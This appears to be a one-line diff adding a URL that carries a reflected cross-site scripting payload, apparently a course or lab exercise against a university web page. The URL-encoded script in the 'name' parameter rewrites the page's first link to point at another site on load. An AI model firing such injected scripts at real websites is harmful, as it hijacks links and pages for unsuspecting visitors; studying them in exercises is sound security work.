@@ -1,0 +1,1 @@
+http://trurl.cs.illinois.edu/multivac/?name=%3Cscript%3Ewindow.onload%20=%20function(){document.getElementsByTagName(%22a%22)[0].setAttribute(%22href%22,%20%22http://www.ece.illinois.edu/%22)}%3C/script%3E
